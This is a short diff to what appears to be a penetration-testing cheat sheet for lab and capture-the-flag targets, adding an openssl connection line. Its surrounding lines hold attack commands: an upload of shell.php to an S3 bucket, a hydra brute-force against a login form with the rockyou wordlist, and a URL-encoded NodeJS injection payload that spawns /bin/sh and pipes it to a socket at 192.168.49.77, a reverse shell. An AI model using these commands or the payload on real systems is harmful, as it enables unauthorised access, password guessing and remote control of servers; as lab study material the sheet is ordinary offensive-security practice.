@@ -90,6 +90,8 @@ wpscan --url    # or manually browse to /wp-content/plugins/ if no plugins found
 aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb   # aws s3 bucket list
 aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb   # upload file
 hydra [IP_ADDR] http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
+openssl s_client -connect [IP_ADDR]:443
+
 
 ----NodeJS function injection----
 (function(){var+net+%3d+require("net"),cp%3drequire("child_process"),sh%3dcp.spawn("/bin/sh",+[])%3bvar+client+%3d+new+net.Socket()%3b+client.connect(21,+"192.168.49.77",+function(){client.pipe(sh.stdin)%3bsh.stdout.pipe(client)%3bsh.stderr.pipe(client)%3b})%3breturn+/a/%3b})()%3b
